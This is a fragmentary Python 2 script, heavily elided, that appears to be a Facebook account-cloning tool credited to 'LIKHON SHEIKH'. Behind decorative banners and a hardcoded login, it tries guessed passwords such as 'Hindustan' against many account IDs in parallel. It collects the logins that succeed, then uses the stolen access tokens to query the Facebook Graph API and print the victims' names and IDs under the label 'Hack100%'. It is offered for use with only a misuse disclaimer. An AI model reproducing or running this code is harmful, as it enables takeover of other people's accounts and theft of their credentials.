...
\033[1;91m╚═══╩══╩╝╚═╩╝─╚╩═══╩╝─╚═╝
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ LIKHON SHEIKH       ║    
\033[1;98m║✯ LIKHON x SHEIKH           ║  
...
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE LIKHON SHEIKH ~
\033[1;97m************************************************
\033[1;92m╔╗──╔══╦╗╔═╦╗─╔╦═══╦═╗─╔╗
\033[1;92m║║──╚╣╠╣║║╔╣║─║║╔═╗║║╚╗║║
\033[1;92m║║───║║║╚╝╝║╚═╝║║─║║╔╗╚╝║
...
CorrectUsername = "LIKHON"
CorrectPassword = "LIKHON"
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://youtu.be/MaDOxQAU5Qk')
    else:
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mLIKHON SHEIKJ\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mLIKHON SHEIKH\033[1;95m◈•══════•◈•"
		try:
	...
	jalan('          \033[1;91mLIKHON X SHEIKH start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
					       ...
					       if 'access_token' in q:	
						       ...
						       oks.append(user+pass3)
						           ...
						           pass4 = 'Hindustan'										
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mLIKHON-Hack100%'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
	...
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mLIKHON SHEIKH\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By LIKHON SHEIKH--•◈•---»" #Dev:Jam
